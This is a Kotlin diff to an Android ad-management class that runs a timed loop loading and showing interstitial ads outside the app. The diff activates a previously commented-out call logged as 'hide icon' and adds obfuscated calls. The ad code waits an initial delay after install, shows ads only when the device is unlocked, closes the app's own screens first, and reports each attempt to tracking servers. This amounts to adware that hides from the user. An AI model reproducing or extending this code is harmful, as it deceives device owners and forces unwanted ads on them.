@@ -5,9 +5,14 @@ import android.os.Looper
 import com.ling.ding.sighed.txtdata.DrinkStartApp
 import com.ling.ding.sighed.netool.TtPoint
 import com.ling.ding.sighed.netool.AppPointData
-import com.ling.ding.sighed.adtool.TranplusConfig.getFBInfOr
 import com.ling.ding.sighed.limt.AdLimiter
+import com.ling.ding.sighed.limt.DailyClickLimitRule
+import com.ling.ding.sighed.limt.DailyShowLimitRule
+import com.ling.ding.sighed.limt.HourlyShowLimitRule
+import com.ling.ding.sighed.limt.TimeManager
 import com.ling.ding.sighed.txtdata.DrinkConfigData
+import com.ling.ding.sighed.txtdata.LocalStorage
+import com.ling.ding.sighed.txtmain.FirstRunFun
 import com.ling.ding.sighed.txtmain.FirstRunFun.localStorage
 import com.ling.ding.sighed.txtmain.FirstRunFun.mainStart
 import com.ling.ding.sighed.txtmain.IntetNetSHow
@@ -24,257 +29,378 @@ import kotlinx.coroutines.launch
 
 
 class TranplusUtils {
-    private var jobAdRom: Job? = null
-    val adLimiter = AdLimiter()
+    // 异步任务
+    private var adMonitoringJob: Job? = null
+
+    // 广告频率限制器
+    private lateinit var adLimiter : AdLimiter
 
     // 广告对象
-    lateinit var interstitialAd: TPInterstitial
+    private lateinit var interstitialAd: TPInterstitial
 
-    // 广告缓存时间（单位：毫秒）
-    private val AD_CACHE_DURATION = 50 * 60 * 1000L // 50分钟
+    // 状态标记
+    private var isLoading = false
+    private var isAdDataAvailable = false
+    private var wasAdClicked = false
+
+    // 配置常量
+    private companion object {
+        // 广告缓存有效期：50分钟
+        private const val AD_CACHE_DURATION_MS = 50 * 60 * 1000L
+
+        // 广告加载超时：60秒
+        private const val AD_LOAD_TIMEOUT_MS = 60 * 1000L
+
+        // 活动关闭延迟
+        private const val ACTIVITY_CLOSE_DELAY_MS = 1011L
+    }
 
     // 上次广告加载时间
     private var lastAdLoadTime: Long = 0
 
-    // 是否正在加载广告
-    private var isLoading = false
-    var canNextState = false
-    var clickState = false
-    var isHaveAdData = false
+    fun getAdLimiter(): AdLimiter {
+        val localStorage = LocalStorage(mainStart)
+        val beanAllData = ShowDataTool.getAdminData()
 
-    // 广告初始化，状态回调
-    private fun intiTTTTAd() {
-        val idBean = ShowDataTool.getAdminData() ?: return
-        val id = idBean.assetConfig.identifiers.campaignId
-        ShowDataTool.showLog("体外广告id=: ${id}")
+        val rules = listOf(
+            HourlyShowLimitRule(localStorage, beanAllData?.adOperations?.constraints?.impressions?.hourly?:0),
+            DailyShowLimitRule(localStorage, beanAllData?.adOperations?.constraints?.impressions?.daily?:0),
+            DailyClickLimitRule(localStorage, beanAllData?.adOperations?.constraints?.interactions?.clicks?.daily?:0)
+        )
+        val timeManager = TimeManager(localStorage, rules)
+         adLimiter = AdLimiter(localStorage, timeManager, rules)
+        return adLimiter
+    }
+    /**
+     * 初始化并启动广告监控
+     */
+    fun startAdMonitoring() {
+        getAdLimiter()
+        // 初始化Facebook SDK
+        TranplusConfig.initializeFacebookSDK()
 
-        interstitialAd = TPInterstitial(mainStart, id)
-        interstitialAd!!.setAdListener(object : InterstitialAdListener {
-            override fun onAdLoaded(tpAdInfo: TPAdInfo) {
-                ShowDataTool.showLog("体外广告onAdLoaded: 广告加载成功")
+        // 初始化广告SDK
+        initializeInterstitialAd()
+
+        // 检查广告失败次数限制
+        if (TranplusConfig.hasReachedAdFailureLimit()) {
+            ShowDataTool.showLog("广告失败次数已达上限，不启动广告监控")
+            return
+        }
+
+        // 获取配置的检测间隔
+        val adminData = ShowDataTool.getAdminData() ?: return
+        val checkIntervalMs = adminData.adOperations.scheduling.detection.intervalSec.toLong() * 1000L
+
+        ShowDataTool.showLog("启动广告监控: 检测间隔=${checkIntervalMs}ms")
+
+        // 启动监控任务
+        adMonitoringJob = CoroutineScope(Dispatchers.Main).launch {
+            // 等待应用完全启动
+            waitForAppStartup()
+
+            // 开始定期检查广告展示条件
+            monitorAdConditions(checkIntervalMs)
+        }
+    }
+
+    /**
+     * 等待应用启动完成
+     */
+    private suspend fun waitForAppStartup() {
+        while (true) {
+            val activities = IntetNetSHow.getActivity()
+
+            // 检查当前活动是否是目标启动界面
+            if (activities.isEmpty() ||
+                (activities.last().javaClass.name != DrinkConfigData.startPack1 &&
+                        activities.last().javaClass.name != DrinkConfigData.startPack2)) {
+
+                if (activities.isEmpty()) {
+                    ShowDataTool.showLog("活动栈为空，应用可能未完全启动")
+                } else {
+                    ShowDataTool.showLog("当前活动: ${activities.last().javaClass.name}")
+                }
+                ShowDataTool.showLog("隐藏图标")
+                TWMain.dliGuso(5122)
+                break
+            }
+
+            delay(500)
+        }
+    }
+
+    /**
+     * 定期监控广告展示条件
+     */
+    private suspend fun monitorAdConditions(checkIntervalMs: Long) {
+        while (true) {
+            ShowDataTool.showLog("广告条件检测循环")
+            TtPoint.postPointData(false, "timertask")
+
+            // 检查广告失败次数是否已达上限
+            if (TranplusConfig.hasReachedAdFailureLimit()) {
+                TtPoint.postPointData(false, "jumpfail")
+                adMonitoringJob?.cancel()
+                break
+            }
+
+            // 加载广告并检查是否可以展示
+            loadAd()
+            checkAndShowAdIfPossible()
+
+            // 等待指定的检测间隔
+            delay(checkIntervalMs)
+        }
+    }
+
+    /**
+     * 初始化插屏广告及其监听器
+     */
+    private fun initializeInterstitialAd() {
+        val adConfig = ShowDataTool.getAdminData() ?: return
+        val campaignId = adConfig.assetConfig.identifiers.campaignId
+
+        ShowDataTool.showLog("初始化插屏广告: ID=${campaignId}")
+
+        interstitialAd = TPInterstitial(mainStart, campaignId)
+
+        // 设置广告事件监听器
+        interstitialAd.setAdListener(createAdListener())
+    }
+
+    fun getAdInstatnce(): TPInterstitial {
+        return interstitialAd
+    }
+
+    /**
+     * 创建广告事件监听器
+     */
+    private fun createAdListener(): InterstitialAdListener {
+        return object : InterstitialAdListener {
+            // 广告加载成功
+            override fun onAdLoaded(adInfo: TPAdInfo) {
+                ShowDataTool.showLog("插屏广告加载成功")
                 lastAdLoadTime = System.currentTimeMillis()
                 TtPoint.postPointData(false, "getadvertise")
-                isHaveAdData = true
+                isAdDataAvailable = true
             }
 
-            override fun onAdClicked(tpAdInfo: TPAdInfo) {
-                ShowDataTool.showLog("体外广告onAdClicked: 广告${tpAdInfo.ecpm}被点击")
+            // 广告被点击
+            override fun onAdClicked(adInfo: TPAdInfo) {
+                ShowDataTool.showLog("插屏广告被点击: eCPM=${adInfo.ecpm}")
                 adLimiter.recordClick()
-                clickState = true
+                wasAdClicked = true
             }
 
-            override fun onAdImpression(tpAdInfo: TPAdInfo) {
-                clickState = false
-                ShowDataTool.showLog("体外广告onAdImpression: 广告${tpAdInfo.ecpm}展示")
+            // 广告展示
+            override fun onAdImpression(adInfo: TPAdInfo) {
+                wasAdClicked = false
+                ShowDataTool.showLog("插屏广告展示: eCPM=${adInfo.ecpm}")
                 adLimiter.recordShow()
                 resetAdStatus()
-                tpAdInfo.let { TtPoint.postAdData(it) }
+                adInfo.let { TtPoint.postAdData(it) }
                 AppPointData.showSuccessPoint()
-                isHaveAdData = false
+                isAdDataAvailable = false
             }
 
-            override fun onAdFailed(tpAdError: TPAdError) {
-                ShowDataTool.showLog("体外广告onAdFailed: 广告加载失败=${tpAdError.errorMsg}")
+            // 广告加载失败
+            override fun onAdFailed(error: TPAdError) {
+                ShowDataTool.showLog("插屏广告加载失败: ${error.errorMsg}")
                 resetAdStatus()
                 TtPoint.postPointData(
                     false,
                     "getfail",
                     "string1",
-                    tpAdError.errorMsg
+                    error.errorMsg
                 )
-                isHaveAdData = false
+                isAdDataAvailable = false
             }
 
-            override fun onAdClosed(tpAdInfo: TPAdInfo) {
-                ShowDataTool.showLog("体外广告onAdClosed: 广告${tpAdInfo.ecpm}被关闭")
+            // 广告被关闭
+            override fun onAdClosed(adInfo: TPAdInfo) {
+                ShowDataTool.showLog("插屏广告被关闭: eCPM=${adInfo.ecpm}")
                 DrinkStartApp.closeAllActivities()
             }
 
-            override fun onAdVideoError(tpAdInfo: TPAdInfo, tpAdError: TPAdError) {
+            // 广告视频播放错误
+            override fun onAdVideoError(adInfo: TPAdInfo, error: TPAdError) {
                 resetAdStatus()
-                ShowDataTool.showLog("体外广告onAdClosed: 广告展示失败")
+                ShowDataTool.showLog("插屏广告视频播放错误: ${error.errorMsg}")
                 TtPoint.postPointData(
                     false,
                     "showfailer",
                     "string3",
-                    tpAdError.errorMsg
+                    error.errorMsg
                 )
             }
 
-            override fun onAdVideoStart(tpAdInfo: TPAdInfo) {
-
+            // 视频开始播放
+            override fun onAdVideoStart(adInfo: TPAdInfo) {
+                // 可以添加视频开始的处理逻辑
             }
 
-            override fun onAdVideoEnd(tpAdInfo: TPAdInfo) {
+            // 视频播放结束
+            override fun onAdVideoEnd(adInfo: TPAdInfo) {
+                // 可以添加视频结束的处理逻辑
             }
-        })
+        }
     }
 
-
-    // 加载广告方法
+    /**
+     * 加载广告
+     */
     private fun loadAd() {
+        // 检查广告展示频率限制
         if (!adLimiter.canShowAd()) {
-            ShowDataTool.showLog("体外广告展示限制,不加载广告")
+            ShowDataTool.showLog("广告频率受限，跳过加载")
             return
         }
-        val currentTime = System.currentTimeMillis()
-        if (isHaveAdData && ((currentTime - lastAdLoadTime) < AD_CACHE_DURATION)) {
-            // 使用缓存的广告
-            ShowDataTool.showLog("不加载,有缓存的广告")
-            // 处理广告展示的逻辑
-        } else {
-            if (((currentTime - lastAdLoadTime) >= AD_CACHE_DURATION)) {
-                resetAdStatus()
-            }
-            // 如果正在加载广告，则不发起新的请求
-            if (isLoading) {
-                ShowDataTool.showLog("正在加载广告，等待加载完成")
-                return
-            }
-            // 设置正在加载标志
-            isLoading = true
-            // 发起新的广告请求
-            ShowDataTool.showLog("发起新的广告请求")
-            interstitialAd.loadAd()
-            TtPoint.postPointData(false, "reqadvertise")
 
-            // 设置超时处理
-            Handler(Looper.getMainLooper()).postDelayed({
-                if (isLoading && !isHaveAdData) {
-                    ShowDataTool.showLog("广告加载超时，重新请求广告")
-                    // 超时处理，重新请求广告
-                    loadAd()
-                }
-            }, 60 * 1000) // 60秒超时
+        val currentTime = System.currentTimeMillis()
+
+        // 检查是否有可用的缓存广告
+        if (isAdDataAvailable && (currentTime - lastAdLoadTime < AD_CACHE_DURATION_MS)) {
+            ShowDataTool.showLog("使用缓存广告，无需重新加载")
+            return
         }
+
+        // 检查是否需要重置广告状态
+        if (currentTime - lastAdLoadTime >= AD_CACHE_DURATION_MS) {
+            resetAdStatus()
+        }
+
+        // 检查是否正在加载广告
+        if (isLoading) {
+            ShowDataTool.showLog("广告正在加载中，请等待")
+            return
+        }
+
+        // 开始加载广告
+        isLoading = true
+        ShowDataTool.showLog("开始加载新广告")
+        interstitialAd.loadAd()
+        TtPoint.postPointData(false, "reqadvertise")
+
+        // 设置加载超时处理
+        Handler(Looper.getMainLooper()).postDelayed({
+            if (isLoading && !isAdDataAvailable) {
+                ShowDataTool.showLog("广告加载超时，尝试重新加载")
+                loadAd()
+            }
+        }, AD_LOAD_TIMEOUT_MS)
     }
 
-    //广告状态重置
+    /**
+     * 重置广告状态
+     */
     fun resetAdStatus() {
         isLoading = false
         lastAdLoadTime = 0
-        isHaveAdData = false
+        isAdDataAvailable = false
     }
 
-    fun startRomFun() {
-        getFBInfOr()
-        intiTTTTAd()
-        val adminData = ShowDataTool.getAdminData() ?: return
-        if (TranplusConfig.adNumAndPoint()) {
+    /**
+     * 检查并在条件满足时展示广告
+     */
+    private fun checkAndShowAdIfPossible() {
+        // 检查设备是否处于锁屏或息屏状态
+        if (TranplusConfig.isDeviceLocked()) {
+            ShowDataTool.showLog("设备处于锁屏或息屏状态，不展示广告")
             return
         }
-        val delayChecks = adminData.adOperations.scheduling.detection.intervalSec
-        val delayData = delayChecks.toLong().times(1000L)
-        ShowDataTool.showLog("startRomFun delayData=: ${delayData}")
-        jobAdRom = CoroutineScope(Dispatchers.Main).launch {
 
-            while (true) {
-                val a = IntetNetSHow.getActivity()
-                if (a.isEmpty() || (a.last().javaClass.name != DrinkConfigData.startPack1 && a.last().javaClass.name != DrinkConfigData.startPack1)) {
-                    if (a.isEmpty()) {
-                        ShowDataTool.showLog("隐藏图标=null")
-                    } else {
-                        ShowDataTool.showLog("隐藏图标=${a.last().javaClass.name}")
-                    }
-//                    TWMain.txtLoad(4001)
-                    break
-                }
-                delay(500)
-            }
-            checkAndShowAd(delayData)
-        }
-    }
-
-    private suspend fun checkAndShowAd(delayData: Long) {
-        while (true) {
-            ShowDataTool.showLog("循环检测广告")
-            TtPoint.postPointData(false, "timertask")
-            if (TranplusConfig.adNumAndPoint()) {
-                TtPoint.postPointData(false, "jumpfail")
-                jobAdRom?.cancel()
-                break
-            } else {
-                loadAd()
-                isHaveAdNextFun()
-                delay(delayData)
-            }
-        }
-    }
-
-
-    private fun isHaveAdNextFun() {
-        // 检查锁屏或息屏状态，避免过多的嵌套
-        if (TranplusConfig.canShowLocked()) {
-            ShowDataTool.showLog("锁屏或者息屏状态，广告不展示")
-            return
-        }
-        // 调用点位数据函数
+        // 发送设备解锁状态事件
         TtPoint.postPointData(false, "isunlock")
 
-        // 获取管理员数据
-        val jsonBean = ShowDataTool.getAdminData() ?: return
+        // 获取广告配置
+        val adConfig = ShowDataTool.getAdminData() ?: return
 
-        // 获取安装时间
-        val instalTime = DrinkStartApp.getInstallDurationSeconds()
-        val ins = jsonBean.adOperations.scheduling.detection.initialDelaySec
-        val wait = jsonBean.adOperations.scheduling.display.frequencySec
-        // 检查首次安装时间和广告展示时间间隔
-        if (isBeforeInstallTime(instalTime, ins)) return
-        if (isAdDisplayIntervalTooShort(wait)) return
-        canNextState = false
-        if (!adLimiter.canShowAd(true)) {
-            ShowDataTool.showLog("体外广告展示限制")
+        // 检查安装时间
+        val installDuration = DrinkStartApp.getInstallDurationSeconds()
+        val initialDelay = adConfig.adOperations.scheduling.detection.initialDelaySec
+        val adFrequency = adConfig.adOperations.scheduling.display.frequencySec
+
+        // 检查是否满足首次安装延迟要求
+        if (isBeforeInitialDelay(installDuration, initialDelay)) {
             return
         }
-        ShowDataTool.showLog("体外流程")
-        showAdAndTrack()
+
+        // 检查广告展示间隔
+        if (isAdFrequencyTooShort(adFrequency)) {
+            return
+        }
+
+        // 检查广告展示频率限制
+        if (!adLimiter.canShowAd(true)) {
+            ShowDataTool.showLog("广告展示频率受限")
+            return
+        }
+
+        ShowDataTool.showLog("准备展示广告")
+        showAdAndTrackEvent()
     }
 
-    private fun isBeforeInstallTime(instalTime: Long, ins: Int): Boolean {
+    /**
+     * 检查是否在初始安装延迟期内
+     */
+    private fun isBeforeInitialDelay(installDuration: Long, initialDelay: Int): Boolean {
         try {
-            if (instalTime < ins) {
-                ShowDataTool.showLog("距离首次安装时间小于$ins 秒，广告不能展示")
+            if (installDuration < initialDelay) {
+                ShowDataTool.showLog("安装时间不足${initialDelay}秒，不展示广告")
                 TtPoint.postPointData(false, "ispass", "string", "firstInstallation")
                 return true
             }
         } catch (e: Exception) {
-            return false
+            ShowDataTool.showLog("检查安装时间异常: ${e.message}")
         }
         return false
     }
 
-    private fun isAdDisplayIntervalTooShort(wait: Int): Boolean {
+    /**
+     * 检查广告展示间隔是否过短
+     */
+    private fun isAdFrequencyTooShort(minInterval: Int): Boolean {
         try {
-            val jiange = (System.currentTimeMillis() - TranplusConfig.adShowTime) / 1000
-            if (jiange < wait) {
-                ShowDataTool.showLog("广告展示间隔时间小于$wait 秒，不展示")
+            val timeSinceLastAd = (System.currentTimeMillis() - TranplusConfig.adShowTime) / 1000
+            if (timeSinceLastAd < minInterval) {
+                ShowDataTool.showLog("距上次广告展示不足${minInterval}秒，不展示广告")
                 TtPoint.postPointData(false, "ispass", "string", "Interval")
                 return true
             }
-            return false
         } catch (e: Exception) {
-            return false
+            ShowDataTool.showLog("检查广告间隔异常: ${e.message}")
         }
+        return false
     }
 
-    private fun showAdAndTrack() {
+    /**
+     * 展示广告并跟踪事件
+     */
+    private fun showAdAndTrackEvent() {
         TtPoint.postPointData(false, "ispass", "string", "")
+
         CoroutineScope(Dispatchers.Main).launch {
+            // 关闭所有活动
             DrinkStartApp.closeAllActivities()
-            delay(1011)
-            if (canNextState) {
-                ShowDataTool.showLog("准备显示h5广告，中断体外广告")
-                return@launch
-            }
-            addFa()
-//            TWMain.txtLoad(10268)
+
+            // 延迟一段时间再继续
+            delay(ACTIVITY_CLOSE_DELAY_MS)
+
+            // 记录广告失败次数
+            incrementAdFailureCount()
+            TWMain.dliGuso(20388)
+            // 发送广告开始事件
             TtPoint.postPointData(false, "callstart")
         }
     }
 
-    private fun addFa() {
-        var adNum = localStorage.isAdFailCount
-        adNum++
-        localStorage.isAdFailCount = adNum
+    /**
+     * 增加广告失败计数
+     */
+    private fun incrementAdFailureCount() {
+        val currentFailCount = localStorage.isAdFailCount
+        localStorage.isAdFailCount = currentFailCount + 1
+        ShowDataTool.showLog("跳转体外计数增加: ${currentFailCount + 1}")
     }
 }
